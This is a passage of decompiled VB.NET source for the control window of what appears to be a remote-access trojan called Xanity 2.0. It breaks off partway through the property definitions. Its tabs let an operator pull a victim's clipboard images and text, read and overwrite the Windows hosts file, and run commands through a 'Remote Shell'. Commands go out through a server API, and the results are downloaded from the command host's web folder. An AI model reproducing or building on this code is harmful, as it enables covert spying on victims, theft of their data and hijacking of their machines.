Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class misc
        Inherits Form
        ' Methods
        Public Sub New()
            misc.__ENCAddToList(Me)
            Me.server = New API
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = misc.__ENCList
            SyncLock list
                If (misc.__ENCList.Count = misc.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (misc.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = misc.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                misc.__ENCList.Item(index) = misc.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    misc.__ENCList.RemoveRange(index, (misc.__ENCList.Count - index))
                    misc.__ENCList.Capacity = misc.__ENCList.Count
                End If
                misc.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        Public Function Base64Decrypt(ByVal input As String) As Object
            Return Encoding.UTF8.GetString(Convert.FromBase64String(input))
        End Function

        Public Function Base64Encrypt(ByVal input As String) As Object
            Return Convert.ToBase64String(Encoding.UTF8.GetBytes(input))
        End Function

        Private Sub btn_getimage_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("GETCI", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.server.delcmd(host, ("files/" & file & "_cp.jpg"))
                Me.url = (host & "/files/" & file & "_cp.jpg")
                Me.loadimage = New Thread(New ThreadStart(AddressOf Me.checkimage))
                Me.loadimage.Start
                Me.FlatStatusBar1.Text = "Picture retrieved!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_load_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_hosts.txt"))
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("LHF", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_hosts.txt")
                Me.loadhosts = New Thread(New ThreadStart(AddressOf Me.check))
                Me.loadhosts.Start
                Me.FlatStatusBar1.Text = "Hosts-file successfully received!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_loadcptext_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_cptext.txt"))
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("GETCT", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_cptext.txt")
                Me.loadcptext = New Thread(New ThreadStart(AddressOf Me.checkcptext))
                Me.loadcptext.Start
                Me.FlatStatusBar1.Text = "Clipboard Text retrieved!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_save_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If (Operators.ConditionalCompareObjectEqual(Me.server.sendlogs(host, file, Conversions.ToString(Me.Base64Encrypt(Me.rtb_hosts.Text)), "_hosts"), True, False) AndAlso Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("SHF", host, file), True, False)))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.FlatStatusBar1.Text = "Hosts-file saved!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_savecptext_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("SETCT|" & Me.rtb_cptext.Text), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.FlatStatusBar1.Text = "Clipboard Text saved!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_saveimage_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Using dialog As SaveFileDialog = New SaveFileDialog
                    dialog.Filter = "Image | *.jpg"
                    dialog.Title = "Save Clipboard Image"
                    dialog.InitialDirectory = Application.StartupPath
                    If (dialog.ShowDialog = DialogResult.OK) Then
                        Me.PictureBox1.Image.Save(dialog.FileName)
                    End If
                End Using
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_sendcmd_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.rtb_shell.AppendText((">" & Me.tb_command.Text & ChrW(13) & ChrW(10)))
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("CMD|" & Me.tb_command.Text), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.server.delcmd(host, (file & "_cmd.txt"))
                Me.tb_command.Clear
                Me.url = (host & "/" & file & "_cmd.txt")
                Me.loadshell = New Thread(New ThreadStart(AddressOf Me.checkshell))
                Me.loadshell.Start
                Me.FlatStatusBar1.Text = "Command sent!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Function ByteArray2Image(ByVal ByAr As Byte()) As Image
            Dim stream As New MemoryStream(ByAr)
            Return Image.FromStream(stream)
        End Function

        Public Sub check()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWrite(AddressOf Me.Write), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        Public Sub checkcptext()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWriteCPText(AddressOf Me.WriteCPText), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        Public Sub checkimage()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWriteImage(AddressOf Me.WriteImage), New Object() { client.DownloadData(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        Public Sub checkshell()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWriteShell(AddressOf Me.WriteShell), New Object() { client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(misc))
            Me.FormSkin1 = New FormSkin
            Me.DotNetBarTabcontrol1 = New DotNetBarTabcontrol
            Me.TabPage1 = New TabPage
            Me.FlatLabel1 = New FlatLabel
            Me.btn_save = New FlatButton
            Me.btn_load = New FlatButton
            Me.rtb_hosts = New RichTextBox
            Me.TabPage2 = New TabPage
            Me.FlatLabel2 = New FlatLabel
            Me.btn_saveimage = New FlatButton
            Me.btn_getimage = New FlatButton
            Me.PictureBox1 = New PictureBox
            Me.TabPage3 = New TabPage
            Me.btn_savecptext = New FlatButton
            Me.btn_loadcptext = New FlatButton
            Me.rtb_cptext = New RichTextBox
            Me.TabPage4 = New TabPage
            Me.btn_sendcmd = New FlatButton
            Me.tb_command = New TextBox
            Me.rtb_shell = New RichTextBox
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.FlatMini1 = New FlatMini
            Me.FlatMax1 = New FlatMax
            Me.FlatCloseMISC1 = New FlatCloseMISC
            Me.FormSkin1.SuspendLayout
            Me.DotNetBarTabcontrol1.SuspendLayout
            Me.TabPage1.SuspendLayout
            Me.TabPage2.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.TabPage3.SuspendLayout
            Me.TabPage4.SuspendLayout
            Me.SuspendLayout
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.BorderColor = Color.FromArgb(&H35, &H3A, 60)
            Me.FormSkin1.Controls.Add(Me.DotNetBarTabcontrol1)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatCloseMISC1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.DeepPink
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            Dim size2 As New Size(&H227, &H132)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "Miscellaneous"
            Me.DotNetBarTabcontrol1.Alignment = TabAlignment.Left
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage1)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage2)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage3)
            Me.DotNetBarTabcontrol1.Controls.Add(Me.TabPage4)
            size2 = New Size(&H2C, &H88)
            Me.DotNetBarTabcontrol1.ItemSize = size2
            point2 = New Point(1, 50)
            Me.DotNetBarTabcontrol1.Location = point2
            Me.DotNetBarTabcontrol1.Multiline = True
            Me.DotNetBarTabcontrol1.Name = "DotNetBarTabcontrol1"
            Me.DotNetBarTabcontrol1.SelectedIndex = 0
            size2 = New Size(550, &HEC)
            Me.DotNetBarTabcontrol1.Size = size2
            Me.DotNetBarTabcontrol1.SizeMode = TabSizeMode.Fixed
            Me.DotNetBarTabcontrol1.TabIndex = 4
            Me.TabPage1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage1.Controls.Add(Me.FlatLabel1)
            Me.TabPage1.Controls.Add(Me.btn_save)
            Me.TabPage1.Controls.Add(Me.btn_load)
            Me.TabPage1.Controls.Add(Me.rtb_hosts)
            point2 = New Point(140, 4)
            Me.TabPage1.Location = point2
            Me.TabPage1.Name = "TabPage1"
            Dim padding2 As New Padding(3)
            Me.TabPage1.Padding = padding2
            size2 = New Size(&H196, &HE4)
            Me.TabPage1.Size = size2
            Me.TabPage1.TabIndex = 0
            Me.TabPage1.Text = "Hosts File Editor"
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel1.ForeColor = Color.White
            point2 = New Point(6, &HCB)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&HD6, 13)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 3
            Me.FlatLabel1.Text = "This works only with admin permissions!"
            Me.btn_save.BackColor = Color.Transparent
            Me.btn_save.BaseColor = Color.White
            Me.btn_save.Cursor = Cursors.Hand
            Me.btn_save.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H14F, &HC6)
            Me.btn_save.Location = point2
            Me.btn_save.Name = "btn_save"
            Me.btn_save.Rounded = False
            size2 = New Size(&H41, &H17)
            Me.btn_save.Size = size2
            Me.btn_save.TabIndex = 2
            Me.btn_save.Text = "Save"
            Me.btn_save.TextColor = Color.Black
            Me.btn_load.BackColor = Color.Transparent
            Me.btn_load.BaseColor = Color.DeepPink
            Me.btn_load.Cursor = Cursors.Hand
            Me.btn_load.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H108, &HC6)
            Me.btn_load.Location = point2
            Me.btn_load.Name = "btn_load"
            Me.btn_load.Rounded = False
            size2 = New Size(&H41, &H17)
            Me.btn_load.Size = size2
            Me.btn_load.TabIndex = 1
            Me.btn_load.Text = "Load"
            Me.btn_load.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.rtb_hosts.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.rtb_hosts.Font = New Font("Segoe UI", 10!)
            Me.rtb_hosts.ForeColor = Color.White
            point2 = New Point(6, 6)
            Me.rtb_hosts.Location = point2
            Me.rtb_hosts.Name = "rtb_hosts"
            size2 = New Size(&H18A, &HBA)
            Me.rtb_hosts.Size = size2
            Me.rtb_hosts.TabIndex = 0
            Me.rtb_hosts.Text = ""
            Me.TabPage2.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage2.Controls.Add(Me.FlatLabel2)
            Me.TabPage2.Controls.Add(Me.btn_saveimage)
            Me.TabPage2.Controls.Add(Me.btn_getimage)
            Me.TabPage2.Controls.Add(Me.PictureBox1)
            point2 = New Point(140, 4)
            Me.TabPage2.Location = point2
            Me.TabPage2.Name = "TabPage2"
            padding2 = New Padding(3)
            Me.TabPage2.Padding = padding2
            size2 = New Size(&H196, &HE4)
            Me.TabPage2.Size = size2
            Me.TabPage2.TabIndex = 1
            Me.TabPage2.Text = "Clipboard Image"
            Me.FlatLabel2.AutoSize = True
            Me.FlatLabel2.BackColor = Color.Transparent
            Me.FlatLabel2.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel2.ForeColor = Color.White
            point2 = New Point(9, &HCC)
            Me.FlatLabel2.Location = point2
            Me.FlatLabel2.Name = "FlatLabel2"
            size2 = New Size(&HB7, 13)
            Me.FlatLabel2.Size = size2
            Me.FlatLabel2.TabIndex = 6
            Me.FlatLabel2.Text = "This works only with .bmp images!"
            Me.btn_saveimage.BackColor = Color.Transparent
            Me.btn_saveimage.BaseColor = Color.White
            Me.btn_saveimage.Cursor = Cursors.Hand
            Me.btn_saveimage.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H152, &HC7)
            Me.btn_saveimage.Location = point2
            Me.btn_saveimage.Name = "btn_saveimage"
            Me.btn_saveimage.Rounded = False
            size2 = New Size(&H41, &H17)
            Me.btn_saveimage.Size = size2
            Me.btn_saveimage.TabIndex = 5
            Me.btn_saveimage.Text = "Save"
            Me.btn_saveimage.TextColor = Color.Black
            Me.btn_getimage.BackColor = Color.Transparent
            Me.btn_getimage.BaseColor = Color.DeepPink
            Me.btn_getimage.Cursor = Cursors.Hand
            Me.btn_getimage.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&HF9, &HC7)
            Me.btn_getimage.Location = point2
            Me.btn_getimage.Name = "btn_getimage"
            Me.btn_getimage.Rounded = False
            size2 = New Size(&H53, &H17)
            Me.btn_getimage.Size = size2
            Me.btn_getimage.TabIndex = 4
            Me.btn_getimage.Text = "Get Image"
            Me.btn_getimage.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            point2 = New Point(6, 6)
            Me.PictureBox1.Location = point2
            Me.PictureBox1.Name = "PictureBox1"
            size2 = New Size(&H18D, &HBB)
            Me.PictureBox1.Size = size2
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 0
            Me.PictureBox1.TabStop = False
            Me.TabPage3.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage3.Controls.Add(Me.btn_savecptext)
            Me.TabPage3.Controls.Add(Me.btn_loadcptext)
            Me.TabPage3.Controls.Add(Me.rtb_cptext)
            point2 = New Point(140, 4)
            Me.TabPage3.Location = point2
            Me.TabPage3.Name = "TabPage3"
            size2 = New Size(&H196, &HE4)
            Me.TabPage3.Size = size2
            Me.TabPage3.TabIndex = 2
            Me.TabPage3.Text = "Clipboard Text"
            Me.btn_savecptext.BackColor = Color.Transparent
            Me.btn_savecptext.BaseColor = Color.White
            Me.btn_savecptext.Cursor = Cursors.Hand
            Me.btn_savecptext.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H14F, &HC5)
            Me.btn_savecptext.Location = point2
            Me.btn_savecptext.Name = "btn_savecptext"
            Me.btn_savecptext.Rounded = False
            size2 = New Size(&H41, &H17)
            Me.btn_savecptext.Size = size2
            Me.btn_savecptext.TabIndex = 4
            Me.btn_savecptext.Text = "Save"
            Me.btn_savecptext.TextColor = Color.Black
            Me.btn_loadcptext.BackColor = Color.Transparent
            Me.btn_loadcptext.BaseColor = Color.DeepPink
            Me.btn_loadcptext.Cursor = Cursors.Hand
            Me.btn_loadcptext.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H108, &HC5)
            Me.btn_loadcptext.Location = point2
            Me.btn_loadcptext.Name = "btn_loadcptext"
            Me.btn_loadcptext.Rounded = False
            size2 = New Size(&H41, &H17)
            Me.btn_loadcptext.Size = size2
            Me.btn_loadcptext.TabIndex = 3
            Me.btn_loadcptext.Text = "Load"
            Me.btn_loadcptext.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.rtb_cptext.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.rtb_cptext.Font = New Font("Segoe UI", 10!)
            Me.rtb_cptext.ForeColor = Color.White
            point2 = New Point(6, 5)
            Me.rtb_cptext.Location = point2
            Me.rtb_cptext.Name = "rtb_cptext"
            size2 = New Size(&H18A, &HBA)
            Me.rtb_cptext.Size = size2
            Me.rtb_cptext.TabIndex = 1
            Me.rtb_cptext.Text = ""
            Me.TabPage4.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage4.Controls.Add(Me.btn_sendcmd)
            Me.TabPage4.Controls.Add(Me.tb_command)
            Me.TabPage4.Controls.Add(Me.rtb_shell)
            point2 = New Point(140, 4)
            Me.TabPage4.Location = point2
            Me.TabPage4.Name = "TabPage4"
            size2 = New Size(&H196, &HE4)
            Me.TabPage4.Size = size2
            Me.TabPage4.TabIndex = 3
            Me.TabPage4.Text = "Remote Shell"
            Me.btn_sendcmd.BackColor = Color.Transparent
            Me.btn_sendcmd.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.btn_sendcmd.Cursor = Cursors.Hand
            Me.btn_sendcmd.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H14D, &HC5)
            Me.btn_sendcmd.Location = point2
            Me.btn_sendcmd.Name = "btn_sendcmd"
            Me.btn_sendcmd.Rounded = False
            size2 = New Size(&H41, &H17)
            Me.btn_sendcmd.Size = size2
            Me.btn_sendcmd.TabIndex = 4
            Me.btn_sendcmd.Text = "Send"
            Me.btn_sendcmd.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.tb_command.BackColor = Color.Black
            Me.tb_command.Font = New Font("Segoe UI", 10!)
            Me.tb_command.ForeColor = Color.White
            point2 = New Point(6, &HC5)
            Me.tb_command.Location = point2
            Me.tb_command.Name = "tb_command"
            size2 = New Size(&H141, &H19)
            Me.tb_command.Size = size2
            Me.tb_command.TabIndex = 1
            Me.rtb_shell.BackColor = Color.Black
            Me.rtb_shell.Font = New Font("Segoe UI", 10!)
            Me.rtb_shell.ForeColor = Color.White
            point2 = New Point(6, 5)
            Me.rtb_shell.Location = point2
            Me.rtb_shell.Name = "rtb_shell"
            size2 = New Size(&H18A, &HBA)
            Me.rtb_shell.Size = size2
            Me.rtb_shell.TabIndex = 0
            Me.rtb_shell.Text = ""
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H11E)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.DeepPink
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H227, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 3
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H1D9, 13)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = 2
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H1F1, 13)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = 1
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatCloseMISC1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatCloseMISC1.BackColor = Color.White
            Me.FlatCloseMISC1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatCloseMISC1.Font = New Font("Marlett", 10!)
            point2 = New Point(&H209, 13)
            Me.FlatCloseMISC1.Location = point2
            Me.FlatCloseMISC1.Name = "FlatCloseMISC1"
            size2 = New Size(&H12, &H12)
            Me.FlatCloseMISC1.Size = size2
            Me.FlatCloseMISC1.TabIndex = 0
            Me.FlatCloseMISC1.Text = "FlatCloseMISC1"
            Me.FlatCloseMISC1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H227, &H132)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "misc"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "misc"
            Me.TransparencyKey = Color.Fuchsia
            Me.FormSkin1.ResumeLayout(False)
            Me.DotNetBarTabcontrol1.ResumeLayout(False)
            Me.TabPage1.ResumeLayout(False)
            Me.TabPage1.PerformLayout
            Me.TabPage2.ResumeLayout(False)
            Me.TabPage2.PerformLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.TabPage3.ResumeLayout(False)
            Me.TabPage4.ResumeLayout(False)
            Me.TabPage4.PerformLayout
            Me.ResumeLayout(False)
        End Sub

        Private Sub tb_command_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs)
            If (e.KeyCode = Keys.Enter) Then
                Me.btn_sendcmd_Click(RuntimeHelpers.GetObjectValue(sender), Nothing)
            End If
        End Sub

        Public Sub Write(ByVal [text] As String)
            Me.rtb_hosts.Text = Conversions.ToString(Me.Base64Decrypt([text]))
        End Sub

        Public Sub WriteCPText(ByVal [text] As String)
            Me.rtb_cptext.Text = [text]
        End Sub

        Public Sub WriteImage(ByVal bytes As Byte())
            Me.PictureBox1.Image = Me.ByteArray2Image(bytes)
        End Sub

        Public Sub WriteShell(ByVal [text] As String)
            Me.rtb_shell.AppendText(([text] & ChrW(13) & ChrW(10) & ">"))
            Me.rtb_shell.ScrollToCaret
        End Sub


        ' Properties
        Friend Overridable Property btn_getimage As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_getimage
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_getimage_Click)
                If (Not Me._btn_getimage Is Nothing) Then
                    RemoveHandler Me._btn_getimage.Click, handler
                End If
                Me._btn_getimage = value
                If (Not Me._btn_getimage Is Nothing) Then
                    AddHandler Me._btn_getimage.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_load As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_load
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_load_Click)
                If (Not Me._btn_load Is Nothing) Then
                    RemoveHandler Me._btn_load.Click, handler
                End If
                Me._btn_load = value
                If (Not Me._btn_load Is Nothing) Then
                    AddHandler Me._btn_load.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_loadcptext As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_loadcptext
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_loadcptext_Click)
                If (Not Me._btn_loadcptext Is Nothing) Then
                    RemoveHandler Me._btn_loadcptext.Click, handler
                End If
                Me._btn_loadcptext = value
                If (Not Me._btn_loadcptext Is Nothing) Then
                    AddHandler Me._btn_loadcptext.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_save As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_save
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_save_Click)
                If (Not Me._btn_save Is Nothing) Then
                    RemoveHandler Me._btn_save.Click, handler
                End If
                Me._btn_save = value
                If (Not Me._btn_save Is Nothing) Then
                    AddHandler Me._btn_save.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_savecptext As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_savecptext
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_savecptext_Click)
                If (Not Me._btn_savecptext Is Nothing) Then
                    RemoveHandler Me._btn_savecptext.Click, handler
                End If
                Me._btn_savecptext = value
                If (Not Me._btn_savecptext Is Nothing) Then
                    AddHandler Me._btn_savecptext.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_saveimage As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_saveimage
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_saveimage_Click)
                If (Not Me._btn_saveimage Is Nothing) Then
                    RemoveHandler Me._btn_saveimage.Click, handler
                End If
                Me._btn_saveimage = value
                If (Not Me._btn_saveimage Is Nothing) Then
                    AddHandler Me._btn_saveimage.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_sendcmd As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_sendcmd
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_sendcmd_Click)
                If (Not Me._btn_sendcmd Is Nothing) Then
                    RemoveHandler Me._btn_sendcmd.Click, handler
                End If
                Me._btn_sendcmd = value
                If (Not Me._btn_sendcmd Is Nothing) Then
                    AddHandler Me._btn_sendcmd.Click, handler
                End If
            End Set
        End Property

